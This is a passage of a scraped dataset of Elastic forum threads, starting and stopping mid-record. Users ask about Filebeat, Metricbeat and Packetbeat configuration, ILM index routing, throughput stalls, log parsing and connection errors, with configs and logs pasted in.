    "body": "I am configuring filebeat to send various module output to Elastic Search v7. We are using ILM. I am looking at the ILM settings here: Configure index lifecycle management - ES 7 and I am wondering if someone could clarify a few items. Here is what I do know: I know when I run the command filebeat setup It loads dashboards, templates, etc. Among these, in the template, it sets an index pattern: index_patterns\" : [ \"filebeat-7.6.2-*\" ], and roll-over alias lifecycle\" : { \"name\" : \"filebeat\", \"rollover_alias\" : \"filebeat-7.6.2\" }, I know Kibana's Dashboards are, in some way configured to look at this default index pattern when it searches for fields. Right? I'm not sure how this particular point works. I know when I update File beat it automatically re-loads this information. I know, since I am using ILM, the index option in Elasticsearch.output is not available. setup.template.name and setup.template.pattern are also unavailable. For a subset of machines, I want to place their data in a different index with a different ILM. The mappings,ingest pipelines, and dashboards for the filebeat modules I use will be the same, I just want to re-route them into a separate index so I can apply a different ILM. I'm stuck on how tobest do this. Looking at the ILM documentation, I can see there is an setup.ilm.rollover_alias option. My questions are: If I define the setup.ilm.rollover_alias, will this separate the subset of machines into a different index as well? Assuming it does, How does this interact with filebeat setup, the Kibana dashboards, and template loading? Will this change be auto-applied every time I update filebeat? Assuming it does not, how can I split these up, still use the filebeat & filebeat modules stuff, and ILM? Lastly, if I use the directive setup.ilm.policy_name is this telling the template to use a per-existing ilm policy in elastic search, or is this telling filebeat to name the policy it uploads into elastic search this name?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "046712a4-e989-419c-8bd3-2ef1fbd36ecb",
    "url": "https://discuss.elastic.co/t/filebeat-performance-stall-sometimes/222207",
    "title": "Filebeat performance stall sometimes",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "GhOsTMZ",
    "date": "March 5, 2020, 12:25pm March 5, 2020, 12:28pm March 5, 2020, 12:49pm March 5, 2020, 5:47pm March 5, 2020, 7:07pm March 6, 2020, 8:39am March 6, 2020, 9:47am March 6, 2020, 10:13am March 6, 2020, 12:17pm March 9, 2020, 8:33am March 9, 2020, 12:55pm March 9, 2020, 3:34pm March 25, 2020, 6:50am March 27, 2020, 3:01pm March 31, 2020, 8:13am April 3, 2020, 9:42am April 3, 2020, 10:04am",
    "body": "Hello anyone! I have a some problems with a Filebeat. I collecting logs from a 2 files and send it to a Logstash. Events rate decreasing after a few hours of work. Events rate becomes normal after restart filebeat or connection to Logstash was reset. Normal event rate is a 250 e/s, stalled - ~50 e/s. Environment: CentOS 8 Filebeat 7.6.0 Filebeat configuration: filebeat.inputs: - type: log enabled: true paths: - /var/log/nginx/access.log* exclude_files: ['.gz$'] fields_under_root: true fields: source_type: nginx_access filebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: false setup.template.settings: index.number_of_shards: 1 setup.kibana: output.logstash: hosts: [\"elk.local:5043\"] monitoring.enabled: true monitoring.cluster_uuid: \"a7Povx8cTK-IN_uQpDC8kA\" monitoring.elasticsearch: hosts: [\"elk.local:9200\"] Event rate with comments: filebeat_event_rate_1878×245 36.3 KB Memory usage with comments: filebeat_memory_1899×255 46.3 KB Memory usage and event rate in a connection reset: filebeat_1886×792 95.3 KB",
    "website_area": "discuss",
    "replies": 17
  },
  {
    "id": "8594e5b9-0fee-416b-83b7-242d50d4dfb8",
    "url": "https://discuss.elastic.co/t/filebeat-not-running/226211",
    "title": "FileBeat not running",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Vlad_Piratov",
    "date": "April 2, 2020, 12:33pm April 3, 2020, 9:10am",
    "body": "Hi, I recently started working with this product on debian 8. I found the book for version 6.0.0, and set it (ELK). The problem is this: I can't run FileBeat to send syslog logstash logs (FileBeat -> logstash -> elastic -> kibana). What I do for this: the yml configuration file is below running filebeat log file at startup Screenshot of kibana (data was not uploaded there) yml path.data: /var/lib/logstash path.config: /etc/logstash/conf.d/*.conf config.reload.automatic: true config.reload.interval: 3s http.host: \"192.168.10.185\" path.logs: /var/log/logstash 2020-04-02T15:29:55+03:00 INFO Home path: [/usr/share/filebeat/bin] Config path: [/usr/share/filebeat/bin] Data path: [/usr/share/filebeat/bin/data] Logs path: [/usr/share/filebeat/bin/logs] 2020-04-02T15:29:55+03:00 INFO Beat UUID: db2bfc23-cc99-48b6-98d9-4b4a942aa3d1 2020-04-02T15:29:55+03:00 INFO Metrics logging every 30s 2020-04-02T15:29:55+03:00 INFO Setup Beat: filebeat; Version: 6.0.0 2020-04-02T15:29:55+03:00 INFO Beat name: astra 2020-04-02T15:29:55+03:00 ERR Not loading modules. Module directory not found: /usr/share/filebeat/bin/module 2020-04-02T15:29:55+03:00 INFO filebeat start running. 2020-04-02T15:29:55+03:00 INFO Registry file set to: /usr/share/filebeat/bin/data/registry 2020-04-02T15:29:55+03:00 INFO Loading registrar data from /usr/share/filebeat/bin/data/registry 2020-04-02T15:29:55+03:00 INFO States Loaded from registrar: 12 2020-04-02T15:29:55+03:00 WARN Filebeat is unable to load the Ingest Node pipelines for the configured modules because the Elasticsearch output is not configured/enabled. If you have already loaded the Ingest Node pipelines or are using Logstash pipelines, you can ignore this warning. 2020-04-02T15:29:55+03:00 INFO Loading Prospectors: 1 2020-04-02T15:29:55+03:00 INFO Starting Registrar 2020-04-02T15:29:56+03:00 INFO Starting prospector of type: log; id: 11204088409762598069 2020-04-02T15:29:56+03:00 WARN BETA: Dynamic config reload is enabled. 2020-04-02T15:29:56+03:00 INFO Loading and starting Prospectors completed. Enabled prospectors: 1 2020-04-02T15:29:56+03:00 INFO Config reloader started 2020-04-02T15:29:56+03:00 INFO Harvester started for file: /var/log/gufw.log 2020-04-02T15:29:56+03:00 INFO Harvester started for file: /var/log/daemon.log 2020-04-02T15:30:01+03:00 ERR Not loading modules. Module directory not found: /usr/share/filebeat/bin/module 2020-04-02T15:30:01+03:00 INFO Starting 1 runners ... 2020-04-02T15:30:09+03:00 INFO Harvester started for file: /var/log/auth.log 2020-04-02T15:30:09+03:00 INFO Harvester started for file: /var/log/kern.log 2020-04-02T15:30:25+03:00 INFO Non-zero metrics in the last 30s: beat.memstats.gc_next=8965600 beat.memstats.memory_alloc=6087488 beat.memstats.memory_total=54968536 filebeat.events.active=4117 filebeat.events.added=12325 filebeat.events.done=8208 filebeat.harvester.open_files=4 filebeat.harvester.running=4 filebeat.harvester.started=4 libbeat.config.module.running=1 libbeat.config.module.starts=1 libbeat.config.reloads=5 libbeat.output.events.acked=8192 libbeat.output.events.active=4096 libbeat.output.events.batches=6 libbeat.output.events.total=12288 libbeat.output.read.bytes=24 libbeat.output.type=logstash libbeat.output.write.bytes=305862 libbeat.pipeline.clients=1 libbeat.pipeline.events.active=4117 libbeat.pipeline.events.filtered=16 libbeat.pipeline.events.published=12308 libbeat.pipeline.events.retry=2048 libbeat.pipeline.events.total=12325 libbeat.pipeline.queue.acked=8192 registrar.states.current=12 registrar.states.update=8208 registrar.writes=18 2020-04-02T15:30:55+03:00 INFO Non-zero metrics in the last 30s: beat.memstats.gc_next=11606912 beat.memstats.memory_alloc=6149680 beat.memstats.memory_total=81818200 filebeat.events.added=6144 filebeat.events.done=6144 filebeat.harvester.open_files=4 filebeat.harvester.running=4 libbeat.config.module.running=1 libbeat.config.reloads=6 libbeat.output.events.acked=6144 libbeat.output.events.batches=3 libbeat.output.events.total=6144 libbeat.output.read.bytes=18 libbeat.output.write.bytes=151854 libbeat.pipeline.clients=1 libbeat.pipeline.events.active=4117 libbeat.pipeline.events.published=6144 libbeat.pipeline.events.total=6144 libbeat.pipeline.queue.acked=6144 registrar.states.current=12 registrar.states.update=6144 registrar.writes=3 image1408×462 47.2 KB",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "5e8ca2a6-cedc-4350-8198-5840779411e8",
    "url": "https://discuss.elastic.co/t/es-k8s-aks-auditlogs-via-filebeat/226036",
    "title": "ES K8s (AKS) auditlogs via filebeat",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "VishalBhalla",
    "date": "April 1, 2020, 11:38am April 2, 2020, 8:56am April 2, 2020, 10:54am April 2, 2020, 5:41pm April 2, 2020, 6:55pm April 3, 2020, 8:54am",
    "body": "Hi all. I just wanted to confirm my thinking with what I'm trying to achieve. We currently have an version 7.6.2 ES stack running on kubernetes in Azure AKS. The ES audit logs are currently being sent to stdout (so available as pod logs). I was thinking I could create a filebeat pod to collect those logs, but it seems the wrong way to go about it? I was taking this route because we already have metricbeat setup in this fashion to collect system stats. Am I right in thinking we should have the audit logs written to disk in the pods, and then install filebeat in each ES pod to hoover them up? Thanks in advance.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "9833160e-67c9-4e38-ab57-19a538e10ab9",
    "url": "https://discuss.elastic.co/t/metricbeat-ceph-module-using-ceph-restful-api-nautilus-release/226224",
    "title": "Metricbeat CEPH module using ceph-restful api (nautilus release)",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "eihkoh",
    "date": "April 2, 2020, 2:01pm April 3, 2020, 8:43am",
    "body": "Hi, Somebody is using the Metricbeat Ceph module to collect some of Ceph statistics and sending it to ElasticSearch? This Topic is more or less the same as the previous one: 'Metricbeat Ceph stats collection breaks for Ceph Mimic release As already mention in the previous topic the ceph-rest-api is completely replaced by ceph restful plugin as part of the Ceph mgr module. Any feedback will be appreciated. Thanks.. eihkoh",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e3e20cd9-88fd-45db-af65-bba2bbd0923d",
    "url": "https://discuss.elastic.co/t/parse-text-to-json-in-filebeat/226146",
    "title": "Parse text to Json in Filebeat",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Bhanu1",
    "date": "April 2, 2020, 1:23am April 2, 2020, 8:52am April 2, 2020, 1:46pm April 3, 2020, 8:40am",
    "body": "Need help to parse rsyslog data to elastic search 2020-04-01T06:12:05+00:00 log-forwarder-rs6zr myrtfapp-685c9695fd-pppnk_fe614c {\"log\":\"2020-04-01T06:12:05.453Z\\u0009INFO\\u0009[monitoring]\\u0009log/log.go:144\\u0009Non-zero metrics in the last 30s\\u0009{\"monitoring\": {\"metrics\": {\"beat\":{\"cpu\":{\"system\":{\"ticks\":26350,\"time\":{\"ms\":5}},\"total\":{\"ticks\":247940,\"time\":{\"ms\":54},\"value\":247940},\"user\":{\"ticks\":221590,\"time\":{\"ms\":49}}},\"handles\":{\"limit\":{\"hard\":1000000,\"soft\":1000000},\"open\":7},\"info\":{\"ephemeral_id\":\"426529a5-b992-47c8-be2f-a792fd82242b\",\"uptime\":{\"ms\":148590996}},\"memstats\":{\"gc_next\":1316312,\"memory_alloc\":1202712,\"memory_total\":8941460576,\"rss\":-241664}},\"filebeat\":{\"events\":{\"added\":51,\"done\":51},\"harvester\":{\"open_files\":1,\"running\":1}},\"libbeat\":{\"config\":{\"module\":{\"running\":0},\"reloads\":3},\"output\":{\"events\":{\"acked\":51,\"batches\":2,\"total\":51},\"read\":{\"bytes\":70},\"write\":{\"bytes\":3589}},\"pipeline\":{\"clients\":1,\"events\":{\"active\":0,\"published\":51,\"total\":51},\"queue\":{\"acked\":51}}},\"registrar\":{\"states\":{\"current\":1,\"update\":51},\"writes\":{\"success\":2,\"total\":2}},\"system\":{\"load\":{\"1\":0.01,\"15\":0.11,\"5\":0.05,\"norm\":{\"1\":0.005,\"15\":0.055,\"5\":0.025}}}}}}\\n\",\"stream\":\"stderr\",\"time\":\"2020-04-01T06:12:05.454164098Z\"}",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "54d44933-0f76-40a9-a951-e6a4b651a8e3",
    "url": "https://discuss.elastic.co/t/could-not-locate-that-index-pattern-field-id-flow-locality/225441",
    "title": "Could not locate that index-pattern-field (id: flow.locality)",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "opoplawski",
    "date": "March 27, 2020, 3:41pm March 30, 2020, 9:13am April 2, 2020, 11:33pm April 3, 2020, 8:12am",
    "body": "I'm starting to use the Filebeat netflow module. I've imported the filebeat 7.6.1 template and dashboards, but one of the visualizations generates this error: Could not locate that index-pattern-field (id: flow.locality) The data certainly contains that field, but I don't see that field in the index template. Should I file a bug or is something else going on? Thanks.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "59d55b86-f524-4943-b02d-9eb9d8e2fd7b",
    "url": "https://discuss.elastic.co/t/elk-setup-on-ibm-mq/226163",
    "title": "ELK setup on IBM MQ",
    "category": [
      "Beats"
    ],
    "author": "Deena",
    "date": "April 3, 2020, 7:16am",
    "body": "We are in process of doing a POC for setting up ELK stack for gathering IBM MQ Log data and QMGR metrics data into ELK. While working with ELK we found beat modules for MQ LOG but not with QMGR metrics. Can we setup the IBM MQ metrics data in to ELK? Please share the configuration process. Any help is much appreciated. Thank you,",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "50e0177d-2a06-4683-8927-1ff1f5d621e6",
    "url": "https://discuss.elastic.co/t/metricbeat-elasticsearch-fine-metricbeat-kafka-logstash-elasticsearch-not/226272",
    "title": "Metricbeat->Elasticsearch fine; Metricbeat->Kafka->Logstash->ElasticSearch not",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "thom1",
    "date": "April 2, 2020, 6:59pm April 2, 2020, 7:28pm April 2, 2020, 7:37pm April 2, 2020, 7:39pm April 2, 2020, 9:41pm",
    "body": "Using version 7.6.2 of everything Elastic, and version 2.12-2.4.1 of Kafka When I install metricbeat on some test host, and sent those beats directly to Elasticsearch, the [Metricbeat System] ECS dashboard looks fine and loads information for all hosts running metricbeat. However, when I use Kafka as an intermediary, and then pull from Kafka into Elasticsearch using Logstash, no data is pulled into the [Metricbeat System] ECS dashboard, or at least some is but there are tons of visualization errors. Here is my conf file for what I thought should work but doesn't (in /etc/logstash/conf.d): input { kafka { bootstrap_servers => [\"kafka1:9092,kafka2:9092,kafka3:9092\"] topics => [\"metricbeat\"] codec => json } } output { elasticsearch { hosts => [\"elasticsearch:9200\"] index => \"metricbeat-\" } } You will note that my index is hardcoded to something simple, which I suspect is the problem. However, when I use something like: index => \"%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}\" it doesn't interpolate the values, and just creates an index with the quoted value literally. Any help would be appreciated.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "811a8bef-1bbb-4372-b3fd-488b538e1936",
    "url": "https://discuss.elastic.co/t/logstash-or-beats/226220",
    "title": "Logstash or Beats",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Michaelk1",
    "date": "April 2, 2020, 1:47pm April 2, 2020, 2:29pm April 2, 2020, 5:16pm April 2, 2020, 6:14pm",
    "body": "I would like an experienced opinion on whether to use Logstash or Beats to ship logs to Elasticsearch for an enterprise network. What is the advantage of using either and of using both? I want to be able to ship windows system and security events from over 10 Windows servers and to ship filebeat and packetbeat logs from Zeek and Wazuh. What do I ship to logstash with beats and what do I ship directly to elasticsearch with beats?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "0e9e15b9-5b60-47fc-82d5-c06c202f4258",
    "url": "https://discuss.elastic.co/t/state-service-metricset-fails-on-headless-services/226131",
    "title": "State_service metricset fails on headless services",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Anya_Sabo",
    "date": "April 1, 2020, 10:21pm April 2, 2020, 8:13am April 2, 2020, 4:22pm",
    "body": "I was going to open a github issue, but it told me to open a discuss thread first. I didn't see anything similar in discuss or in github for this topic. It is easy to reproduce using the kubernetes module and having ECK deployed though (which uses headless services by default). I'm not sure what behavior makes sense here though. The kubernetes module's state_service metricset fails to index headless kubernetes services, which explicitly have None as the ClusterIP. This is the meat of the error being thrown: {\"type\":\"mapper_parsing_exception\",\"reason\":\"failed to parse field [kubernetes.service.cluster_ip] of type [ip] in document with id 'yf_HN3EBEveQZJtR4sNf'. Preview of field's value: 'None'\",\"caused_by\":{\"type\":\"illegal_argument_exception\",\"reason\":\"'None' is not an IP string literal. And the full error: {\"level\":\"warn\",\"timestamp\":\"2020-04-01T22:06:18.853Z\",\"caller\":\"elasticsearch/client.go:517\",\"message\":\"Cannot index event publisher.Event{Content:beat.Event{Timestamp:time.Time{wall:0xbf9961f66a396c38, ext:118425703920, loc:(*time.Location)(0x7eb3060)}, Meta:null, Fields:{\\\"agent\\\":{\\\"ephemeral_id\\\":\\\"655841f1-0966-41c1-822a-c6ea9af7fdc8\\\",\\\"hostname\\\":\\\"kube-elastic-metricbeat-7dd4c74c74-jz25z\\\",\\\"id\\\":\\\"7b3c4cbc-103d-4684-8ec6-4255fa2cd7c5\\\",\\\"type\\\":\\\"metricbeat\\\",\\\"version\\\":\\\"7.6.1\\\"},\\\"cloud\\\":{\\\"availability_zone\\\":\\\"europe-west1-d\\\",\\\"instance\\\":{\\\"id\\\":\\\"1037830539447785865\\\",\\\"name\\\":\\\"gke-sabo-dev-cluster-default-pool-617f5774-gl30\\\"},\\\"machine\\\":{\\\"type\\\":\\\"n1-standard-8\\\"},\\\"project\\\":{\\\"id\\\":\\\"elastic-cloud-dev\\\"},\\\"provider\\\":\\\"gcp\\\"},\\\"ecs\\\":{\\\"version\\\":\\\"1.4.0\\\"},\\\"event\\\":{\\\"dataset\\\":\\\"kubernetes.service\\\",\\\"duration\\\":29916059,\\\"module\\\":\\\"kubernetes\\\"},\\\"host\\\":{\\\"name\\\":\\\"kube-elastic-metricbeat-7dd4c74c74-jz25z\\\"},\\\"kubernetes\\\":{\\\"labels\\\":{\\\"common_k8s_elastic_co_type\\\":\\\"elasticsearch\\\",\\\"elasticsearch_k8s_elastic_co_cluster_name\\\":\\\"kube-elastic-monitor\\\",\\\"elasticsearch_k8s_elastic_co_statefulset_name\\\":\\\"kube-elastic-monitor-es-default\\\"},\\\"namespace\\\":\\\"default\\\",\\\"service\\\":{\\\"cluster_ip\\\":\\\"None\\\",\\\"created\\\":\\\"2020-04-01T15:22:51.000Z\\\",\\\"name\\\":\\\"kube-elastic-monitor-es-default\\\",\\\"type\\\":\\\"ClusterIP\\\"}},\\\"metricset\\\":{\\\"name\\\":\\\"state_service\\\",\\\"period\\\":10000},\\\"service\\\":{\\\"address\\\":\\\"kube-elastic-kube-state-metrics.default:8080\\\",\\\"type\\\":\\\"kubernetes\\\"}}, Private:interface {}(nil), TimeSeries:true}, Flags:0x0, Cache:publisher.EventCache{m:common.MapStr(nil)}} (status=400): {\\\"type\\\":\\\"mapper_parsing_exception\\\",\\\"reason\\\":\\\"failed to parse field [kubernetes.service.cluster_ip] of type [ip] in document with id 'yf_HN3EBEveQZJtR4sNf'. Preview of field's value: 'None'\\\",\\\"caused_by\\\":{\\\"type\\\":\\\"illegal_argument_exception\\\",\\\"reason\\\":\\\"'None' is not an IP string literal.\\\"}}\"} And a service yaml that causes the error: 17:09 $ kubectl get svc kube-elastic-monitor-es-default -o yaml apiVersion: v1 kind: Service metadata: creationTimestamp: \"2020-04-01T15:22:51Z\" labels: common.k8s.elastic.co/type: elasticsearch elasticsearch.k8s.elastic.co/cluster-name: kube-elastic-monitor elasticsearch.k8s.elastic.co/statefulset-name: kube-elastic-monitor-es-default name: kube-elastic-monitor-es-default namespace: default ownerReferences: - apiVersion: elasticsearch.k8s.elastic.co/v1 blockOwnerDeletion: true controller: true kind: Elasticsearch name: kube-elastic-monitor uid: 47ba3d61-9c4d-479b-9689-4bb184aa7541 resourceVersion: \"2612356\" selfLink: /api/v1/namespaces/default/services/kube-elastic-monitor-es-default uid: ff1c86e3-f00a-423b-9bbb-dfc8df613ee1 spec: clusterIP: None selector: common.k8s.elastic.co/type: elasticsearch elasticsearch.k8s.elastic.co/cluster-name: kube-elastic-monitor elasticsearch.k8s.elastic.co/statefulset-name: kube-elastic-monitor-es-default sessionAffinity: None type: ClusterIP status: loadBalancer: {} For confirmed bugs, please report: Version: Metricbeat 7.6.1 Operating System: GKE 1.15.9 Discuss Forum URL: N/A Steps to Reproduce: Deploy this chart https://github.com/elastic/kube-elastic/tree/gaupdate and look at the metricbeat deployment logs.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "44f9e879-6fc8-4440-aa99-dcde9345b948",
    "url": "https://discuss.elastic.co/t/how-to-properly-launch-filebeat-in-container/225984",
    "title": "How to properly launch filebeat in container?",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 1, 2020, 6:26am April 1, 2020, 10:04am April 1, 2020, 10:19am April 2, 2020, 3:21pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "83b8b1dc-d344-4d76-80bc-4a13aaa024b8",
    "url": "https://discuss.elastic.co/t/cannot-connect-packetbeat-7-6-1-1-x86-64-oss-version-to-aws-managed-es-v7-4-2/224553",
    "title": "Cannot connect \"packetbeat-7.6.1-1.x86_64\"[oss version] to AWS Managed ES [v7.4.2]",
    "category": [
      "Beats",
      "Packetbeat"
    ],
    "author": "Yessen",
    "date": "March 22, 2020, 11:37am March 22, 2020, 12:27pm April 2, 2020, 2:48pm",
    "body": "output of curl from the box where packetbeat is installed : curl https://aws-es-domain-endpoint.com:443 { \"name\" : \"99abf5c22ca3a14294d52af72a17df86\", \"cluster_name\" : \"528130383285:test-infra-ek\", \"cluster_uuid\" : \"-P1lge8AQAOBr6wdEINnvg\", \"version\" : { \"number\" : \"7.4.2\", \"build_flavor\" : \"oss\", \"build_type\" : \"tar\", \"build_hash\" : \"unknown\", \"build_date\" : \"2020-02-06T10:08:47.217314Z\", \"build_snapshot\" : false, \"lucene_version\" : \"8.2.0\", \"minimum_wire_compatibility_version\" : \"6.8.0\", \"minimum_index_compatibility_version\" : \"6.0.0-beta1\" }, \"tagline\" : \"You Know, for Search\" } packetbeat.yml config : #################### Packetbeat Configuration Example ######################### # This file is an example configuration file highlighting only the most common # options. The packetbeat.reference.yml file from the same directory contains all the # supported options with more comments. You can use it as a reference. # # You can find the full configuration reference here: # https://www.elastic.co/guide/en/beats/packetbeat/index.html #============================== Network device ================================ # Select the network interface to sniff the data. On Linux, you can use the # \"any\" keyword to sniff on all connected interfaces. packetbeat.interfaces.device: any #================================== Flows ===================================== # Set `enabled: false` or comment out all options to disable flows reporting. packetbeat.flows: # Set network flow timeout. Flow is killed if no packet is received before being # timed out. timeout: 30s # Configure reporting period. If set to -1, only killed flows will be reported period: 10s #========================== Transaction protocols ============================= packetbeat.protocols: - type: icmp # Enable ICMPv4 and ICMPv6 monitoring. Default: false enabled: true - type: amqp # Configure the ports where to listen for AMQP traffic. You can disable # the AMQP protocol by commenting out the list of ports. ports: [5672] - type: cassandra #Cassandra port for traffic monitoring. ports: [9042] - type: dhcpv4 # Configure the DHCP for IPv4 ports. ports: [67, 68] - type: dns # Configure the ports where to listen for DNS traffic. You can disable # the DNS protocol by commenting out the list of ports. ports: [53] - type: http # Configure the ports where to listen for HTTP traffic. You can disable # the HTTP protocol by commenting out the list of ports. ports: [80, 8080, 8000, 5000, 8002] - type: memcache # Configure the ports where to listen for memcache traffic. You can disable # the Memcache protocol by commenting out the list of ports. ports: [11211] - type: mysql # Configure the ports where to listen for MySQL traffic. You can disable # the MySQL protocol by commenting out the list of ports. ports: [3306,3307] - type: pgsql # Configure the ports where to listen for Pgsql traffic. You can disable # the Pgsql protocol by commenting out the list of ports. ports: [5432] - type: redis # Configure the ports where to listen for Redis traffic. You can disable # the Redis protocol by commenting out the list of ports. ports: [6379] - type: thrift # Configure the ports where to listen for Thrift-RPC traffic. You can disable # the Thrift-RPC protocol by commenting out the list of ports. ports: [9090] - type: mongodb # Configure the ports where to listen for MongoDB traffic. You can disable # the MongoDB protocol by commenting out the list of ports. ports: [27017] - type: nfs # Configure the ports where to listen for NFS traffic. You can disable # the NFS protocol by commenting out the list of ports. ports: [2049] - type: tls # Configure the ports where to listen for TLS traffic. You can disable # the TLS protocol by commenting out the list of ports. ports: - 443 # HTTPS - 993 # IMAPS - 995 # POP3S - 5223 # XMPP over SSL - 8443 - 8883 # Secure MQTT - 9243 # Elasticsearch #==================== Elasticsearch template setting ========================== setup.template.settings: index.number_of_shards: 1 #index.codec: best_compression #_source.enabled: false setup.template: name: \"client-box\" pattern: \"client-box-*\" #================================ General ===================================== # The name of the shipper that publishes the network data. It can be used to group # all the transactions sent by a single shipper in the web interface. #name: # The tags of the shipper are included in their own field with each # transaction published. #tags: [\"service-X\", \"web-tier\"] # Optional fields that you can specify to add additional information to the # output. #fields: # env: staging #============================== Dashboards ===================================== # These settings control loading the sample dashboards to the Kibana index. Loading # the dashboards is disabled by default and can be enabled either by setting the # options here or by using the `setup` command. #setup.dashboards.enabled: false # The URL from where to download the dashboards archive. By default this URL # has a value which is computed based on the Beat name and version. For released # versions, this URL points to the dashboard archive on the artifacts.elastic.co # website. #setup.dashboards.url: #============================== Kibana ===================================== # Starting with Beats version 6.0.0, the dashboards are loaded via the Kibana API. # This requires a Kibana endpoint configuration. setup.kibana: # Kibana Host # Scheme and port can be left out and will be set to the default (http and 5601) # In case you specify and additional path, the scheme is required: http://localhost:5601/path # IPv6 addresses should always be defined as: https://[2001:db8::1]:5601 #host: \"localhost:5601\" # Kibana Space ID # ID of the Kibana Space into which the dashboards should be loaded. By default, # the Default Space will be used. #space.id: #============================= Elastic Cloud ================================== # These settings simplify using Packetbeat with the Elastic Cloud (https://cloud.elastic.co/). # The cloud.id setting overwrites the `output.elasticsearch.hosts` and # `setup.kibana.host` options. # You can find the `cloud.id` in the Elastic Cloud web UI. #cloud.id: # The cloud.auth setting overwrites the `output.elasticsearch.username` and # `output.elasticsearch.password` settings. The format is `<user>:<pass>`. #cloud.auth: #================================ Outputs ===================================== # Configure what output to use when sending the data collected by the beat. #-------------------------- Elasticsearch output ------------------------------ output.elasticsearch: # Array of hosts to connect to. hosts: [\"https://aws-es-domain-endpoint.com:443\"] index: \"client-box-%{+yyyy.MM.dd}\" # Protocol - either `http` (default) or `https`. #protocol: \"https\" # Authentication credentials - either API key or username/password. #api_key: \"id:api_key\" #username: \"elastic\" #password: \"changeme\" #----------------------------- Logstash output -------------------------------- #output.logstash: # The Logstash hosts #hosts: [\"localhost:5044\"] # Optional SSL. By default is off. # List of root certificates for HTTPS server verifications #ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] # Certificate for SSL client authentication #ssl.certificate: \"/etc/pki/client/cert.pem\" # Client Certificate Key #ssl.key: \"/etc/pki/client/cert.key\" #================================ Processors ===================================== # Configure processors to enhance or manipulate events generated by the beat. processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ #================================ Logging ===================================== # Sets log level. The default log level is info. # Available log levels are: error, warning, info, debug #logging.level: debug # At debug level, you can selectively enable logging only for some components. # To enable all selectors use [\"*\"]. Examples of other selectors are \"beat\", # \"publish\", \"service\". #logging.selectors: [\"*\"] #============================== X-Pack Monitoring =============================== # packetbeat can export internal metrics to a central Elasticsearch monitoring # cluster. This requires xpack monitoring to be enabled in Elasticsearch. The # reporting is disabled by default. # Set to true to enable the monitoring reporter. #monitoring.enabled: false # Sets the UUID of the Elasticsearch cluster under which monitoring data for this # Packetbeat instance will appear in the Stack Monitoring UI. If output.elasticsearch # is enabled, the UUID is derived from the Elasticsearch cluster referenced by output.elasticsearch. #monitoring.cluster_uuid: # Uncomment to send the metrics to Elasticsearch. Most settings from the # Elasticsearch output are accepted here as well. # Note that the settings should point to your Elasticsearch *monitoring* cluster. # Any setting that is not set is automatically inherited from the Elasticsearch # output configuration, so if you have the Elasticsearch output configured such # that it is pointing to your Elasticsearch monitoring cluster, you can simply # uncomment the following line. #monitoring.elasticsearch: #================================= Migration ================================== # This allows to enable 6.7 migration aliases #migration.6_to_7.enabled: true errors : Mar 22 11:23:02 client-box packetbeat[8926]: 2020-03-22T11:23:02.392Z INFO elasticsearch/client.go:757 Attempting to connect to Elasticsearch version 7.4.2 Mar 22 11:23:17 client-box packetbeat[8926]: 2020-03-22T11:23:17.649Z INFO [monitoring] log/log.go:145 Non-zero metrics in the last 30s {\"monitoring\": {\"metrics\": {\"beat\":{\"cpu\":{\"system\":{\"ticks\":320},\"total\":{\"ticks\":2560,\"time\":{\"ms\":4},\"value\":2560},\"user\":{\"ticks\":2240,\"time\":{\"ms\":4}}},\"handles\":{\"limit\":{\"hard\":4096,\"soft\":1024},\"open\":8},\"info\":{\"ephemeral_id\":\"6807605d-45bf-4247-a964-8c84b1e0fe0e\",\"uptime\":{\"ms\":2400020}},\"memstats\":{\"gc_next\":75363648,\"memory_alloc\":38625472,\"memory_total\":162505992},\"runtime\":{\"goroutines\":40}},\"libbeat\":{\"config\":{\"module\":{\"running\":0}},\"output\":{\"read\":{\"bytes\":996},\"write\":{\"bytes\":370}},\"pipeline\":{\"clients\":15,\"events\":{\"active\":4117,\"retry\":50}}},\"system\":{\"load\":{\"1\":0,\"15\":0,\"5\":0,\"norm\":{\"1\":0,\"15\":0,\"5\":0}}}}}} Mar 22 11:23:45 client-box packetbeat[8926]: 2020-03-22T11:23:45.522Z ERROR pipeline/output.go:100 Failed to connect to backoff(elasticsearch(https://aws-es-domain-endpoint.com:443)): Connection marked as failed because the onConnect callback failed: request checking for ILM availability failed: 401 Unauthorized: {\"Message\":\"Your request: '/_xpack' is not allowed.\"} Mar 22 11:23:45 client-box packetbeat[8926]: 2020-03-22T11:23:45.522Z INFO pipeline/output.go:93 Attempting to reconnect to backoff(elasticsearch(https://aws-es-domain-endpoint.com:443)) with 57 reconnect attempt(s) Mar 22 11:23:45 client-box packetbeat[8926]: 2020-03-22T11:23:45.522Z INFO [publisher] pipeline/retry.go:196 retryer: send unwait-signal to consumer Mar 22 11:23:45 client-box packetbeat[8926]: 2020-03-22T11:23:45.522Z INFO [publisher] pipeline/retry.go:198 done Mar 22 11:23:45 client-box packetbeat[8926]: 2020-03-22T11:23:45.522Z INFO [publisher] pipeline/retry.go:173 retryer: send wait signal to consumer Mar 22 11:23:45 client-box packetbeat[8926]: 2020-03-22T11:23:45.522Z INFO 